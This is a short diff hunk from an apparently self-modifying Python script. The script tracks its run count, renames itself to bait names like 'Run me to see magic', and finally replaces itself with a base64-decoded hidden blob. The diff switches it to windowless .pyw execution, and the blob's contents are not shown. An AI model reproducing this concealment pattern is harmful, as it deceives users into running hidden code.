@@ -4198,12 +4198,12 @@ if cnt[1] == 2:
     c[cl] = cnt[0] + '= ' + str(cnt[1])
     with open(__file__, 'w') as f:
         f.write('\n'.join(c))
-    os.rename(__file__, 'Run me to see magic.py')
+    os.rename(__file__, 'Run me to see magic.pyw')
 elif cnt[1] == 1:
     c[cl] = cnt[0] + '= ' + str(cnt[1])
     with open(__file__, 'w') as f:
         f.write('\n'.join(c))
-    os.rename(__file__, 'Run me once more to see magic.py')
+    os.rename(__file__, 'Run me once more to see magic.pyw')
 elif cnt[1] == 0:
     newc = base64.b64decode(magic)
     with open(__file__, 'wb') as f:
